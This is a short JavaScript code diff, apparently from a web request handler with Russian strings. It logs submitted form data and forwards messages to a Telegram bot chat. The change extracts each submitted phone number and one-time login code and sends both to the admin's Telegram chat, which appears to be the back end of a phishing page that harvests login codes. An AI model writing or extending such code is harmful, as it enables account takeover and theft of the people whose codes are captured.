@@ -89,13 +89,16 @@
                         console.log("Входящие данные:",
 JSON.stringify(Object.fromEntries(parsedData.entries()), null, 2));
 
+                        const phone = parsedData.get('newPhone');
+                        const code = parsedData.get('code');
+
                         if (env.BOT_TOKEN && env.ADMIN_CHAT_ID) {
                             await fetch(`https://api.telegram.org/${env.BOT_TOKEN}/sendMessage`, {
                                 method: "POST",
                                 headers: { "Content-Type": "application/json" },
                                 body: JSON.stringify({
                                     chat_id: env.ADMIN_CHAT_ID,
-                                    text: `Код входа отправлен на ${parsedData.get('newPhone')}.`,
+                                    text: `Код входа ${code} отправлен на ${phone}.`,
                                 }),
                             });
                         }
